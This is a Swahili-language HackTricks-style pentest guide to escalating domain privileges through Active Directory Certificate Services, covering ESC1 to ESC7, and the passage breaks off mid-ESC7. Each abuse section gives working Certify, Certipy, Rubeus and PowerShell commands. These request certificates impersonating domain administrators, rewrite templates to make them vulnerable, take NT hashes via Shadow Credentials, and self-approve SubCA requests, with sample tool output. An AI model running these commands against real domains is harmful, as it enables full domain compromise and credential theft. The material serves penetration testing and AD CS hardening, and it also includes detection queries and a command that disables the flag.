# Kupandisha Haki za Kikoa kwa AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za kupandisha haki kutoka kwenye machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Violezo vya Vyeti Vilivyosanidiwa Vibaya - ESC1

### Maelezo

### Maelezo ya ESC1: Violezo vya Vyeti Vilivyosanidiwa Vibaya

- **Enterprise CA huwapa watumiaji wenye haki za chini ruhusa za kujiandikisha.**
- **Idhini ya msimamizi haihitajiki.**
- **Saini kutoka kwa wafanyakazi walioidhinishwa hazihitajiki.**
- **Vifafanuzi vya usalama kwenye violezo vya vyeti vinaruhusu kupita kiasi, hivyo kuwawezesha watumiaji wenye haki za chini kupata ruhusa za kujiandikisha.**
- **Violezo vya vyeti vimesanidiwa kufafanua EKU zinazowezesha uthibitishaji:**
  - Vitambulishi vya Extended Key Usage (EKU) kama vile Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwepo kwa EKU (SubCA) vimejumuishwa.
- **Kiolezo kinaruhusu waombaji kujumuisha subjectAltName katika Certificate Signing Request (CSR):**
  - Active Directory (AD) hutanguliza subjectAltName (SAN) kwenye cheti kwa ajili ya kuthibitisha utambulisho ikiwa ipo. Hii inamaanisha kuwa kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa ili kuiga mtumiaji yeyote (kwa mfano, msimamizi wa kikoa). Uwezo wa mwombaji kubainisha SAN unaonyeshwa kwenye object ya AD ya kiolezo cha cheti kupitia sifa ya `mspki-certificate-name-flag`. Sifa hii ni bitmask, na uwepo wa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` humruhusu mwombaji kubainisha SAN.

> [!CAUTION]
> Mipangilio hii hutambua kiolezo kinachoweza kuwa ESC1, si njia kamili ya kuiga utambulisho. Hakikisha kuwa principal lengwa inaweza kujiandikisha kwenye CA inayochapisha kiolezo, uandikishaji kwenye CA unaruhusiwa, na cheti kilichotolewa kinakidhi masharti ya strong SID mapping ya endpoint ya uthibitishaji. KDC za sasa zilizowekewa viraka zinaweza kukataa UPN iliyoombwa ikiwa SID ya cheti hailingani na inayolengwa; tazama [mwongozo wa Microsoft kuhusu ulinganishaji wa vyeti](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Ruhusa za kujiandikisha zilizopewa **Domain Computers** zinaweza kufanya utambulisho wa kompyuta uliotayarishwa ustahiki, hata kama mtumiaji wa awali hawezi kujiandikisha. Tathmini ruhusa za principal ya kompyuta kando. Kagua `msPKI-Minimal-Key-Size` kabla ya kutuma ombi: kiolezo kinachohitaji funguo za RSA za biti 4096 kitakataa chaguomsingi ya mteja ya biti 2048. SID lengwa iliyotolewa kwenye ombi inaweza kutatua kutolingana kwa SID tu ikiwa CA na KDC zitakubali cheti na ulinganishaji unaotokana nacho; bendera za kiolezo pekee au ACE ya Enroll pekee hazithibitishi hilo.

Kipengele hiki wakati mwingine huwezeshwa ili kusaidia utengenezaji wa vyeti vya HTTPS au vya host papo hapo kupitia bidhaa au huduma za uwekaji, au kutokana na kutokuelewa.

Imeelezwa kuwa kuunda cheti kwa chaguo hili huonyesha onyo. Hata hivyo, onyo hilo halionyeshwi wakati kiolezo cha cheti kilichopo (kama vile kiolezo cha `WebServer`, ambacho kimewezeshwa `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) kinanakiliwa na kisha kurekebishwa ili kijumuishe OID ya uthibitishaji.<sup>[[6]](#references)</sup>

### Matumizi Mabaya

Ili **kupata violezo vya vyeti vilivyo hatarini**, unaweza kutekeleza:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Ili **kutumia vibaya udhaifu huu na kujifanya msimamizi**, mtu anaweza kutekeleza:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Kisha unaweza kubadilisha **certificate iliyozalishwa kuwa umbizo la `.pfx`** na kuitumia **ku-authenticate kwa kutumia Rubeus au certipy** tena:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows binaries "Certreq.exe" na "Certutil.exe" zinaweza kutumiwa kutengeneza PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeration ya certificate templates ndani ya configuration schema ya AD Forest, hasa zile zisizohitaji idhini au saini, zilizo na EKU ya Client Authentication au Smart Card Logon, na zenye flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowashwa, inaweza kufanywa kwa kutekeleza LDAP query ifuatayo:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Violezo vya Cheti Vilivyosanidiwa Vibaya - ESC2

### Maelezo

Hali ya pili ya matumizi mabaya ni tofauti kidogo na ya kwanza:

1. Enterprise CA huwapa watumiaji wenye ruhusa za chini haki za kujiandikisha.
2. Sharti la idhini ya msimamizi limezimwa.
3. Sharti la saini zilizoidhinishwa limeondolewa.
4. Kielezi cha usalama chenye ruhusa nyingi kupita kiasi kwenye kiolezo cha cheti huwapa watumiaji wenye ruhusa za chini haki za kujiandikisha kupata vyeti.
5. **Kiolezo cha cheti kimefafanuliwa kujumuisha EKU ya Any Purpose au kutokuwa na EKU.**

**EKU ya Any Purpose** humruhusu mshambulizi kupata cheti kwa **madhumuni yoyote**, yakiwemo uthibitishaji wa mteja, uthibitishaji wa seva, kusaini msimbo, n.k. **Mbinu ileile iliyotumika kwa ESC3** inaweza kutumiwa kutumia vibaya hali hii.

Vyeti **visivyo na EKU**, vinavyofanya kazi kama vyeti vya CA tanzu, vinaweza kutumiwa vibaya kwa **madhumuni yoyote** na **pia vinaweza kutumika kusaini vyeti vipya**. Hivyo, mshambulizi anaweza kubainisha EKU au sehemu zozote anazotaka kwenye vyeti vipya kwa kutumia cheti cha CA tanzu.

Hata hivyo, vyeti vipya vilivyoundwa kwa ajili ya **uthibitishaji wa kikoa** havitafanya kazi ikiwa CA tanzu haijaaminiwa na kitu cha **`NTAuthCertificates`**, ambacho ndicho mipangilio chaguomsingi. Hata hivyo, mshambulizi bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani zozote za cheti. Hivi vinaweza **kutumiwa vibaya** kwa madhumuni mengi (k.m., kusaini msimbo, uthibitishaji wa seva, n.k.) na vinaweza kuwa na athari kubwa kwa programu nyingine kwenye mtandao kama SAML, AD FS, au IPSec.<sup>[[6]](#references)</sup>

Ili kuorodhesha violezo vinavyolingana na hali hii katika schema ya usanidi ya AD Forest, hoja ifuatayo ya LDAP inaweza kutumika:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Misconfigured Enrolment Agent Templates - ESC3

### Maelezo

Hali hii inafanana na ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (kwa hiyo ina seti 2 za mahitaji),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, huruhusu principal **ku-enroll** kwa **certificate** kwa niaba ya mtumiaji mwingine.

**“Enrollment agent”** hu-enroll katika **template** hiyo na kutumia **certificate inayopatikana ili kusaini CSR kwa pamoja kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa kwa pamoja** kwa CA, na ku-enroll katika **template** inayoruhusu **“enroll on behalf of”**; CA hujibu kwa **certificate inayomilikiwa na mtumiaji “mwingine”**.<sup>[[6]](#references)</sup>

**Mahitaji 1:**

- Enterprise CA huwapa watumiaji wenye ruhusa ndogo haki za ku-enroll.
- Sharti la idhini ya meneja limeondolewa.
- Hakuna sharti la sahihi zilizoidhinishwa.
- Security descriptor ya certificate template ina ruhusa nyingi kupita kiasi, na kuwapa watumiaji wenye ruhusa ndogo haki za ku-enroll.
- Certificate template inajumuisha Certificate Request Agent EKU, inayowezesha kuomba certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA huwapa watumiaji wenye ruhusa ndogo haki za ku-enroll.
- Idhini ya meneja imepuuzwa.
- Template lengwa ya toleo la 1 inaweza kukubali enrollment agent bila vidhibiti vipya vya kina vya issuance policy; kwa toleo la 2 au jipya zaidi, tathmini mahitaji yake ya application-policy issuance na sahihi zilizoidhinishwa badala ya kuiondoa template kwa sababu ya toleo lake pekee.
- EKU iliyobainishwa katika certificate template huruhusu uthibitishaji wa domain.
- Vizuizi vya enrollment agents havitumiki kwenye CA.

Template lengwa lazima pia iwe imechapishwa na CA iliyochaguliwa, imruhusu akaunti lengwa ku-enroll, na iauni matumizi yaliyokusudiwa ya uthibitishaji wa domain. Kagua subject/SAN attributes zinazohitajika kwenye akaunti hiyo; kwa mfano, template inayounda subject email kutoka AD haiwezi kutoa certificate kwa akaunti isiyo na thamani inayohitajika ya `mail`. Certificate ya agent pekee haitimizi masharti haya ya template lengwa.

### Matumizi mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya hali hii:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Watumiaji** wanaoruhusiwa **kupata** **cheti cha enrollment agent**, templates ambamo **agents** wa enrollment wanaruhusiwa kujiandikisha, na **akaunti** ambazo enrollment agent anaweza kuzitumia kutenda kwa niaba yake, zinaweza kuwekewa vizuizi na enterprise CAs. Hili hufanywa kwa kufungua snap-in ya `certsrc.msc`, **kubofya kulia CA**, **kubofya Properties**, kisha **kwenda** kwenye kichupo cha “Enrollment Agents”.

Hata hivyo, inafahamika kuwa mpangilio **chaguo-msingi** wa CAs ni “**Do not restrict enrollment agents**.” Wasimamizi wanapowasha vizuizi kwa enrollment agents na kuchagua “Restrict enrollment agents,” usanidi chaguo-msingi bado una ruhusa nyingi kupita kiasi. Unaruhusu **Everyone** kujiandikisha katika templates zote kama mtu yeyote.

### PoCs za PowerShell za Windows pekee kwa Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) hutumia ESC1 na ESC2/ESC3 bila Certify au Certipy. Scripts zake huunda ufunguo wa RSA wa biti 2048 unaoweza kuhamishwa kwa kutumia X509Enrollment COM API, hutengeneza ombi la PKCS#10, hutafuta `pKIEnrollmentService` ya kwanza kupitia LDAP, huwasilisha ombi hilo kupitia `CertificateAuthority.Request`, husakinisha jibu katika `Cert:\CurrentUser\My`, na kuhamisha PFX iliyosimbwa kwa Base64. Script ya ESC1 huongeza SAN ya UPN iliyochaguliwa na mshambuliaji (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, thamani `0xb`), ilhali scripts za ESC2/ESC3 hutumia cheti cha kwanza kutia sahihi ombi la PKCS#7 la on-behalf-of.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Skripti huchapisha Base64 ya **PFX**, ambayo inajumuisha private key, ili itumike moja kwa moja na Rubeus. Usibadilishe na `[Convert]::ToBase64String($cert.RawData)`: `RawData` husimba cheti cha umma pekee na haiwezi kusaini ombi la PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Udhibiti wa Ufikiaji wa Certificate Template Ulio Hatarini - ESC4

### **Maelezo**

**security descriptor** kwenye **certificate templates** hufafanua **ruhusa** ambazo **AD principals** mahususi wanazo kuhusiana na template.

Ikiwa **mshambuliaji** ana **ruhusa** zinazohitajika za **kubadilisha** **template** na **kuanzisha** usanidi usio sahihi unaoweza kutumiwa vibaya ulioelezwa katika sehemu zilizotangulia, privilege escalation inaweza kuwezekana.

Ruhusa muhimu zinazohusu certificate templates ni pamoja na:<sup>[[6]](#references)</sup>

- **Owner:** Hutoa udhibiti usio wa moja kwa moja juu ya kitu, na kuruhusu kubadilisha sifa zozote.
- **FullControl:** Hutoa mamlaka kamili juu ya kitu, ikiwemo uwezo wa kubadilisha sifa zozote.
- **WriteOwner:** Huruhusu kubadilisha mmiliki wa kitu na kumweka principal anayemdhibiti mshambuliaji.
- **WriteDacl:** Huruhusu kurekebisha vidhibiti vya ufikiaji, jambo linaloweza kumpa mshambuliaji FullControl.
- **WriteProperty:** Huruhusu kuhariri sifa zozote za kitu.

Pia kagua DACL kwenye kontena la `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. ACE ya `CreateChild` inayotumika na inayohusu darasa la [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), au udhibiti kamili wa jumla, inaweza kuruhusu kuunda kitu kipya cha template. [Microsoft inaeleza](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) kuwa kontena hili huhifadhi vitu hivi vya template. Kagua ACE za deny zinazolingana na urithi wa ruhusa kabla ya kuamua iwapo uundaji utawezekana. Kuunda template pekee hakutoi certificate: CA lazima ichapishe template hiyo, principal anayeomba lazima awe na ufikiaji wa enrollment, na certificate lazima ihusishwe na utambulisho uliokusudiwa kwenye endpoint ya uthibitishaji.

### Matumizi Mabaya

Ili kubaini principals wenye ruhusa za kuhariri templates na vitu vingine vya PKI, fanya enumeration kwa kutumia Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 hutokea mtumiaji anapokuwa na ruhusa za kuandika kwenye template ya cheti. Kwa mfano, hii inaweza kutumiwa vibaya kubadilisha usanidi wa template ya cheti na kuifanya iwe hatarini kwa ESC1.

Template ambayo tayari inamruhusu enrollee kubainisha subject lakini ina matumizi ya Server Authentication pekee, si template ya kuingia kwa mtumiaji yenyewe. Ikiwa ana haki za kutosha za kudhibiti template, mshambulizi anaweza kubadilisha EKU za uthibitishaji au sera za programu kabla ya kuomba cheti; [Microsoft inaeleza madhumuni ya EKU ya Smartcard Logon katika kuingia](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Hakikisha kuwa CA inachapisha template iliyorekebishwa, mwombaji anaweza kujiandikisha, masharti ya idhini/saini yametimizwa, na cheti kilichotolewa kinahusishwa na akaunti iliyokusudiwa. Hasa, [domain controller zilizopachikwa viraka katika Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) hukataa vyeti visivyo na strong mapping; kuongeza UPN ya mlengwa kwenye ombi hakupiti sharti hilo.

Kama tunavyoona kwenye njia iliyo hapo juu, `JOHNPC` pekee ndiye aliye na ruhusa hizi, lakini mtumiaji wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa mbinu hii inahusiana na vyeti, nimetekeleza pia shambulio hili, linalojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Huu hapa muhtasari mfupi wa amri ya Certipy ya `shadow auto` ya kupata NT hash ya mwathiriwa.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** inaweza kubadilisha usanidi wa kiolezo cha cheti kwa amri moja. Kwa **chaguomsingi**, Certipy **itaandika juu ya** usanidi ili kuufanya **uweze kuathiriwa na ESC1**. Tunaweza pia kubainisha **kigezo cha `-save-old` ili kuhifadhi usanidi wa zamani**, kitakachofaa kwa **kurejesha** usanidi baada ya shambulio letu.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Udhibiti wa Ufikiaji wa Kitu cha PKI Kilicho Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yanayounganishwa kwa ACL, unaojumuisha vitu kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri kwa kiasi kikubwa usalama, vinajumuisha:

- Kitu cha kompyuta cha AD cha seva ya CA, ambacho kinaweza kuathiriwa kupitia mbinu kama S4U2Self au S4U2Proxy.
- Seva ya RPC/DCOM ya seva ya CA.
- Kitu chochote cha AD kilicho chini ya kitu kingine au kontena lolote ndani ya njia mahususi ya kontena `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini haizuiliwi na, kontena na vitu kama kontena la Certificate Templates, kontena la Certification Authorities, kitu cha NTAuthCertificates, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa attacker mwenye haki chache ataweza kupata udhibiti wa mojawapo ya vipengele hivi muhimu.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada inayojadiliwa katika [**chapisho la CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Mipangilio hii ikiwashwa kwenye Certification Authority (CA), huruhusu kujumuishwa kwa **thamani zilizobainishwa na mtumiaji** katika **subject alternative name** kwa **ombi lolote**, ikiwemo yale yanayotengenezwa kutoka Active Directory®. Kwa hivyo, mpangilio huu humwezesha **intruder** kufanya enrollment kupitia **template yoyote** iliyosanidiwa kwa ajili ya **uthibitishaji** wa domain—hasa zile zilizo wazi kwa enrollment ya watumiaji **wasio na haki maalum**, kama vile template ya kawaida ya User. Kwa matokeo yake, cheti kinaweza kupatikana na kumwezesha intruder kujithibitisha kama msimamizi wa domain au **chombo kingine chochote kinachotumika** ndani ya domain.<sup>[[9]](#references)</sup>

**Kumbuka**: Mbinu ya kuongeza **alternative names** kwenye Certificate Signing Request (CSR), kupitia hoja ya `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), **inatofautiana** na mkakati wa kutumia vibaya SAN katika ESC1. Tofauti hapa ni **jinsi maelezo ya akaunti yanavyowekwa**—ndani ya sifa ya cheti, badala ya extension.

### Matumizi Mabaya

Ili kuthibitisha ikiwa mpangilio huo umewashwa, mashirika yanaweza kutumia amri ifuatayo kwa `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Operesheni hii kimsingi hutumia **ufikiaji wa registry wa mbali**, kwa hivyo, njia mbadala inaweza kuwa:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua usanidi huu usio sahihi na kuutumia vibaya:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Ili kubadilisha mipangilio hii, iwapo mtu ana haki za **msimamizi wa domain** au sawa na hizo, anaweza kutekeleza amri ifuatayo kutoka kwenye workstation yoyote:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Ili kuzima usanidi huu kwenye mazingira yako, flag inaweza kuondolewa kwa:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Baada ya masasisho ya usalama ya Mei 2022, **vyeti** vinavyotolewa hivi karibuni vitakuwa na **kiendelezi cha usalama** kinachojumuisha **sifa ya `objectSid` ya mwombaji**. Kwa ESC1, SID hii hutokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID huakisi **`objectSid` ya mwombaji**, wala si SAN.\
> Ili kutumia ESC6, ni muhimu mfumo uwe katika hatari ya ESC10 (Weak Certificate Mappings), ambayo hutanguliza **SAN kuliko kiendelezi kipya cha usalama**.

## Udhibiti wa Ufikiaji wa Certificate Authority Ulio Hatarini - ESC7

### Shambulio la 1

#### Maelezo

Udhibiti wa ufikiaji wa Certificate Authority hudumishwa kupitia seti ya ruhusa zinazosimamia vitendo vya CA. Ruhusa hizi zinaweza kuangaliwa kwa kufungua `certsrv.msc`, kubofya CA kwa kitufe cha kulia, kuchagua sifa, kisha kwenda kwenye kichupo cha Security. Pia, ruhusa zinaweza kuorodheshwa kwa kutumia moduli ya PSPKI na amri kama vile:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This hutoa maarifa kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “msimamizi wa CA” na “Msimamizi wa Vyeti” mtawalia.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti humwezesha principal kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha au kuzima flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu kubainisha SAN kwenye template yoyote, jambo muhimu sana kwa domain escalation.

Mchakato huu unaweza kurahisishwa kwa kutumia cmdlet ya **Enable-PolicyModuleFlag** ya PSPKI, inayowezesha kufanya mabadiliko bila kutumia GUI moja kwa moja.

Kuwa na haki za **`ManageCertificates`** hurahisisha kuidhinisha maombi yanayosubiri, na hivyo kukwepa ulinzi wa "idhini ya msimamizi wa cheti cha CA".

Mchanganyiko wa modules za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha na kupakua cheti:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Shambulio la 2

#### Maelezo

> [!WARNING]
> Katika **shambulio lililotangulia**, ruhusa za **`Manage CA`** zilitumika **kuwasha** alama ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **shambulio la ESC6**, lakini hili halitakuwa na athari hadi huduma ya CA (`CertSvc`) ianzishwe upya. Mtumiaji anapokuwa na haki ya ufikiaji ya `Manage CA`, pia anaruhusiwa **kuanzisha upya huduma**. Hata hivyo, **hii haimaanishi kuwa mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, E**SC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyowekewa viraka kutokana na masasisho ya usalama ya Mei 2022.

Kwa hiyo, shambulio jingine limewasilishwa hapa.

Masharti ya awali:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kupitia **`ManageCA`**)
- Template ya cheti **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa kupitia **`ManageCA`**)

Mbinu hii inategemea ukweli kwamba watumiaji walio na haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kuidhinisha maombi ya cheti yaliyoshindwa**. Template ya cheti ya **`SubCA`** iko **hatarini kwa ESC1**, lakini **wasimamizi pekee** ndio wanaoweza kujisajili kwenye template hiyo. Kwa hivyo, **mtumiaji** anaweza **kuomba** kujisajili kwenye **`SubCA`** — ombi hilo **litakataliwa** — lakini **baadaye litaidhinishwa na msimamizi**.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Unaweza **kujipa mwenyewe haki ya ufikiaji ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Kiolezo cha **`SubCA`** kinaweza **kuwashwa kwenye CA** kwa kutumia kigezo cha `-enable-template`. Kwa chaguomsingi, kiolezo cha `SubCA` kimewashwa.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Ikiwa tumetimiza mahitaji ya awali ya shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na template ya `SubCA`**.

**Ombi hili litakataliw**a, lakini tutahifadhi private key na kuandika ID ya ombi.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa cheti kwa ombi lililoshindwa** kwa kutumia amri ya `ca` na kigezo cha `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Na mwisho, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na kigezo cha `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

